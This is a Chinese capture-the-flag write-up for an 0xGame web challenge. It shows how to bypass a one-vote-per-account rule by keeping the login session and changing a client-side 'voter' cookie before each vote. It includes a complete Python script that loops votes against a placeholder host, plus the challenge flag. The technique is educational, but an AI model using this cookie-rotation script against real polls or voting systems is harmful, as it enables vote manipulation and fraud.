---
title: "关注塔菲谢谢喵：客户端投票身份绕过"
date: "2026-10-07"
categories: "Web"
tags: ["Cookie", "逻辑漏洞", "投票"]
excerpt: "保留登录会话并逐次更换客户端 voter 标识，使同一账号连续完成目标投票。"
slug: "web-taffy-vote"
source_event: "0xGame"
---

> 整理自原有本地题解，保留原始结论，未在此次归档中重新运行赛题。复现材料：`题目 HTTP 服务`。赛题附件未随文章打包。 日期取自原始题解文件的修改日期。 实例地址已替换；认证材料以环境变量表示，个人信息已隐去。

## 题目信息

- 目标：`https://challenge.example.invalid/`
- 类型：Web / 投票逻辑漏洞
- 目标角色：永雏塔菲，`vid=7`
- 目标票数：`200`

## 关键发现

首页加载 `/app.js`，前端写死了投票目标：

```js
let appState = {
  user: "",
  target: { vid: 7, score: 200 },
  characters: [],
};
```

投票成功后前端会显示后端返回的 `res.data.flag`：

```js
const res = await post("/api/vote", { vid: item.id });
if (res.ok) {
  say(res.data.flag || `${res.data.name} +1，当前票数 ${res.data.votes}`);
}
```

正常注册登录后，一个账号投第二票会返回：

```json
{"ok": false, "msg": "一个账号只能投一票！"}
```

但是后端并没有把“是否已投票”可靠绑定到服务端账号或 `sid` 会话，而是依赖客户端可控的 `voter` Cookie。注册后服务端同时设置：

```text
Set-Cookie: voter=guest_xxxxxxxxxxxxxxxx; Path=/
Set-Cookie: sid=...; HttpOnly; Path=/
```

只要保留登录态 `sid`，每次投票前把 `voter` Cookie 改成新的随机值，后端就会把它当成新的投票身份，同一个账号可以连续给塔菲投票。

## 利用脚本

```python
import base64
import secrets
import os
import uuid
from urllib.parse import urlparse

import requests

BASE = "https://challenge.example.invalid"
HOST = urlparse(BASE).hostname

session = requests.Session()
username = "taffy" + uuid.uuid4().hex[:8]
password = os.environ["CTF_REGISTRATION_PASSWORD"]

r = session.post(
    BASE + "/api/register",
    data={"username": username, "password": password},
    timeout=10,
)
print("register:", r.text)

flag_b64 = None
for index in range(1, 260):
    session.cookies.set(
        "voter",
        "guest_" + secrets.token_hex(8),
        domain=HOST,
        path="/",
    )
    r = session.post(BASE + "/api/vote", data={"vid": "7"}, timeout=10)
    data = r.json()
    if not data.get("ok"):
        raise RuntimeError(data)

    result = data["data"]
    if index == 1 or index % 25 == 0 or result.get("flag"):
        print(index, result)

    if result.get("flag"):
        flag_b64 = result["flag"]
        break

print("base64 flag:", flag_b64)
print("decoded flag:", base64.b64decode(flag_b64).decode())
```

## 验证结果

运行后第 200 次投票时返回 flag：

```text
[200] votes=200 flag='MHhHYW1le3YwdGVfNF90YWYzaV9UaGFuazVfbWlAb30='
```

Base64 解码：

```text
0xGame{v0te_4_taf3i_Thank5_mi@o}
```

## 最终结果

```text
0xGame{v0te_4_taf3i_Thank5_mi@o}
```
